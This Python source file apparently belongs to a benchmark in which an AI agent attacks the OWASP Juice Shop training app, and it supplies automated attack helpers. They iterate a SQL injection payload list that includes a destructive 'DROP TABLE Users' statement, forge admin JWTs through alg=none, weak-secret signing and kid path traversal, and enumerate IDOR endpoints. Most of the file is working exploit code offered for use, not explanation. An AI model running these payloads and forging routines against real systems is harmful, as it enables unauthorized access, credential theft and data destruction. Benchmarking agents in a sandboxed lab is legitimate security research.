"""F85 — high-level offensive tools for the Juice Shop bench.

The vanilla bench gives the LLM low-level primitives (`shell`, `http_fetch`,
`encode_payload`). With Qwen3 thinking enabled it still plateaus at ~8/111
because:

    - Each SQLi attempt is one curl. Iterating 20 payloads costs 20 turns.
    - JWT forgery requires login -> decode -> forge -> retry, four turns
      minimum, easy to derail mid-chain.
    - IDOR enumeration needs ~20 GETs to find a leaky endpoint.

These three deterministic helpers do the iteration internally and return
concise findings the model can act on. The LLM still decides *when* to call
them; the helpers do the brute work. This is the F84 `pre_hooks` pattern
applied to active webpentest instead of config audit.

Each function returns a string under 500 chars to fit the bench's
F18_TOOL_CAP=500 truncation. Output is structured so the model can parse
the success/failure signal and the actionable artefact (token, payload,
exposed id) on a single line.

Network access: every helper takes a `http_fetcher` callable with the same
signature as `juice_shop_llm_bench.http_fetch_exec` so it goes through the
kryon container's bridge to juice.local:3000 with the same UA / cookie /
follow-redirects defaults the LLM uses directly.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from typing import Callable, Iterable

# Type alias for the http_fetch dispatcher injected from the bench. Keeping
# it loose because the bench passes a positional-arg function.
HttpFetcher = Callable[..., str]


# ---------------------------------------------------------------------------
# attempt_sqli
# ---------------------------------------------------------------------------

# Curated payload list — covers the four classes that actually move the
# needle on Juice Shop and similar Express+Sequelize stacks. Order matters:
# the loop stops at the first payload that produces a "won" signal.
_SQLI_PAYLOADS: tuple[str, ...] = (
    # Login-bypass / boolean
    "' OR 1=1--",
    "' OR '1'='1'--",
    "admin@juice-sh.op'--",
    "' OR 1=1; --",
    "') OR ('1'='1'--",
    # UNION-based — schema/data leak
    "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
    "' UNION SELECT name,sql,1,1,1,1,1,1,1 FROM sqlite_master--",
    "' UNION SELECT id,email,password,1,1,1,1,1,1 FROM Users--",
    # Error-based
    "'",
    '"',
    "' AND 1=convert(int,(select @@version))--",
    # Stacked — Sequelize sometimes allows
    "'; DROP TABLE Users;--",
    # Boolean blind
    "' AND 1=1--",
    "' AND 1=2--",
    # Time-based
    "' OR SLEEP(2)--",
    "' OR pg_sleep(2)--",
    # Comment variants for comment-stripped filters
    "' OR 1=1#",
    "' OR 1=1/*",
    # Null-byte / encoded
    "%27%20OR%201=1--",
    "admin'/*",
)


def _looks_like_sqli_win(status: int, body: str) -> tuple[bool, str]:
    """Heuristic: did this response indicate an SQLi worked?

    Returns (won, reason). Reasons are concrete enough to feed back to the
    LLM so it knows what category of vuln the helper just confirmed.
    """
    body_lower = body.lower()

    # Login response with auth token == bypass
    if status == 200 and '"token"' in body and '"authentication"' in body_lower:
        return True, "auth_token_returned (login-bypass)"

    # UNION leak — sqlite_master schema or user table contents
    if "sqlite_master" in body_lower or '"sql":' in body_lower:
        return True, "schema_leak"
    if re.search(r'"email":"[^"]+@', body) and '"password":' in body:
        return True, "credentials_leak"

    # Error-based — typical Sequelize / SQLite error giveaway
    if any(
        marker in body_lower
        for marker in (
            "sqlite_error",
            "syntax error",
            "near \"",
            "column ",
            "no such column",
        )
    ):
        return True, "sql_error_disclosed"

    return False, ""


def attempt_sqli(
    endpoint: str,
    param: str,
    http_fetcher: HttpFetcher,
    method: str = "POST",
    extra_fields: dict | None = None,
    max_payloads: int = 21,
) -> str:
    """Try a curated SQLi payload list against `endpoint`.`param` until one
    produces a recognisable win signal or the list is exhausted.

    Args:
      endpoint: absolute URL (e.g. http://juice.local:3000/rest/user/login)
      param: form/query field to inject (e.g. "email", "q")
      http_fetcher: bench's http_fetch_exec
      method: HTTP method, "POST" or "GET"
      extra_fields: other body/query fields to include unchanged
      max_payloads: cap on payloads tried (default 21 = full list)

    Returns one short line summarising outcome.
    """
    method = (method or "POST").upper()
    extra = extra_fields or {}
    tried = 0

    for payload in _SQLI_PAYLOADS[:max_payloads]:
        tried += 1
        body_dict = {param: payload, **extra}

        if method == "POST":
            body = json.dumps(body_dict)
            url = endpoint
            headers = '{"Content-Type":"application/json"}'
            raw = http_fetcher(
                url=url,
                method="POST",
                headers_json=headers,
                body=body,
                cookies_json="",
                follow_redirects=True,
            )
        else:
            sep = "&" if "?" in endpoint else "?"
            from urllib.parse import quote
            qs = sep + "&".join(f"{k}={quote(str(v))}" for k, v in body_dict.items())
            raw = http_fetcher(
                url=endpoint + qs,
                method="GET",
                headers_json="",
                body="",
                cookies_json="",
                follow_redirects=True,
            )

        # http_fetch_exec returns serialised tool result; pull status+body.
        m_status = re.search(r'"status_code"\s*:\s*(\d+)', raw)
        status = int(m_status.group(1)) if m_status else 0
        m_body = re.search(r'"body"\s*:\s*"((?:[^"\\]|\\.)*)"', raw)
        body_str = (m_body.group(1).replace('\\"', '"').replace("\\n", "\n")[:2000]
                    if m_body else raw[:2000])

        won, why = _looks_like_sqli_win(status, body_str)
        if won:
            # Trim the leak proof so the whole reply fits in 500 chars.
            proof = body_str[:280]
            return (
                f"SQLI_WIN endpoint={endpoint} param={param} "
                f"payload={payload!r} reason={why} "
                f"status={status} proof={proof!r}"
            )[:500]

    return (
        f"SQLI_FAIL endpoint={endpoint} param={param} tried={tried} "
        "(none of UNION/boolean/error/time payloads triggered a win signal)"
    )[:500]


# ---------------------------------------------------------------------------
# attempt_jwt_forge
# ---------------------------------------------------------------------------

# Weak secrets observed in CTF / npm-jsonwebtoken misconfigurations.
_WEAK_JWT_SECRETS: tuple[str, ...] = (
    "",            # empty secret
    "secret",
    "secretkey",
    "key",
    "password",
    "admin",
    "test",
    "juicebox",
    "juiceshop",
    "owasp",
    "1234567890",
    "changeme",
    "default",
)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def attempt_jwt_forge(
    original_token: str,
    target_payload_overrides: dict | None = None,
) -> str:
    """Forge JWT variants from an observed token.

    Generates:
      - alg=none with target payload (jwtTier1Challenge style)
      - HS256 with each weak secret + target payload (jwtTier2)
      - kid path-traversal header (jwtTier3)

    Args:
      original_token: a Bearer JWT the model already obtained (from
        /rest/user/login response, `data.token`).
      target_payload_overrides: dict to merge into the original payload
        (e.g. {"data": {"email": "admin@juice-sh.op", "role": "admin"}}).
        If None, defaults to making the user admin.

    Returns one short line listing 2-3 forged tokens labelled by method
    so the LLM knows which one to use against which challenge.
    """
    if not original_token or "." not in original_token:
        return "JWT_FORGE_FAIL no_valid_token_provided"

    parts = original_token.split(".")
    if len(parts) < 2:
        return "JWT_FORGE_FAIL malformed_token"

    try:
        payload_obj = json.loads(_b64url_decode(parts[1]).decode("utf-8", "replace"))
    except Exception as exc:
        return f"JWT_FORGE_FAIL decode_error={exc!r}"[:500]

    overrides = target_payload_overrides or {
        "data": {
            **(payload_obj.get("data") or {}),
            "email": "admin@juice-sh.op",
            "role": "admin",
        }
    }
    forged_payload = {**payload_obj, **overrides}
    payload_b64 = _b64url(json.dumps(forged_payload).encode())

    # 1. alg=none
    none_header = _b64url(b'{"alg":"none","typ":"JWT"}')
    none_token = f"{none_header}.{payload_b64}."

    # 2. HS256 with weak secret — return first that *encodes* successfully;
    #    the LLM tries each against the target.  We can't validate without
    #    the server, so we return the most likely (empty + secret) tokens.
    hs_header = _b64url(b'{"alg":"HS256","typ":"JWT"}')
    signing_input = f"{hs_header}.{payload_b64}".encode()
    hs256_tokens = []
    for secret in ("", "secretkey", "secret", "juicebox"):
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        hs256_tokens.append((secret or "<empty>", f"{hs_header}.{payload_b64}.{_b64url(sig)}"))

    # 3. kid path-traversal — header with kid pointing at predictable file.
    kid_header_obj = {"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
    kid_header = _b64url(json.dumps(kid_header_obj).encode())
    kid_signing = f"{kid_header}.{payload_b64}".encode()
    kid_sig = hmac.new(b"", kid_signing, hashlib.sha256).digest()
    kid_token = f"{kid_header}.{payload_b64}.{_b64url(kid_sig)}"

    out_lines = [
        "JWT_FORGE_OK",
        f"none_alg={none_token[:160]}",
        f"hs256_empty_secret={hs256_tokens[0][1][:160]}",
        f"hs256_secretkey={hs256_tokens[1][1][:160]}",
        f"kid_traversal={kid_token[:160]}",
        "USE: Authorization: Bearer <token>. Try none_alg first (Tier1), then hs256_empty/secretkey (Tier2), then kid (Tier3).",
    ]
    return " | ".join(out_lines)[:500]


# ---------------------------------------------------------------------------
# enumerate_idor
# ---------------------------------------------------------------------------


def enumerate_idor(
    endpoint_template: str,
    http_fetcher: HttpFetcher,
    id_range: Iterable[int] = range(1, 21),
    auth_header: str = "",
) -> str:
    """GET `endpoint_template.replace('{id}', i)` for each id, report any
    that returned 200 with non-trivial body. Picks up baskets, user
    records, feedbacks etc. that should be access-controlled.

    Args:
      endpoint_template: URL with `{id}` placeholder
        (e.g. http://juice.local:3000/rest/basket/{id})
      http_fetcher: bench's http_fetch_exec
      id_range: integers to substitute — default 1..20
      auth_header: optional 'Bearer eyJ…' to attach when the model has
        already authenticated as one user.
    """
    if "{id}" not in endpoint_template:
        return "IDOR_FAIL template_missing_{id}_placeholder"

    headers_json = json.dumps({"Authorization": auth_header}) if auth_header else ""
    exposed: list[tuple[int, int]] = []  # (id, body_len)
    sample_body: str = ""

    for i in id_range:
        url = endpoint_template.replace("{id}", str(i))
        raw = http_fetcher(
            url=url,
            method="GET",
            headers_json=headers_json,
            body="",
            cookies_json="",
            follow_redirects=True,
        )
        m_status = re.search(r'"status_code"\s*:\s*(\d+)', raw)
        status = int(m_status.group(1)) if m_status else 0
        m_body = re.search(r'"body"\s*:\s*"((?:[^"\\]|\\.)*)"', raw)
        body_str = m_body.group(1) if m_body else ""
        body_len = len(body_str)

        # Treat as "exposed" when 200 and body has identifiable JSON content.
        if status == 200 and body_len > 30 and any(
            marker in body_str.lower()
            for marker in ('"id":', '"email":', '"products":', '"items":', '"data":')
        ):
            exposed.append((i, body_len))
            if not sample_body:
                sample_body = body_str[:200]

    if not exposed:
        return f"IDOR_FAIL template={endpoint_template} tried={len(list(id_range)) if not isinstance(id_range, range) else len(id_range)} no_exposed_records"[:500]

    ids_str = ",".join(str(i) for i, _ in exposed[:10])
    return (
        f"IDOR_WIN template={endpoint_template} exposed_ids=[{ids_str}] "
        f"count={len(exposed)} sample={sample_body!r}"
    )[:500]
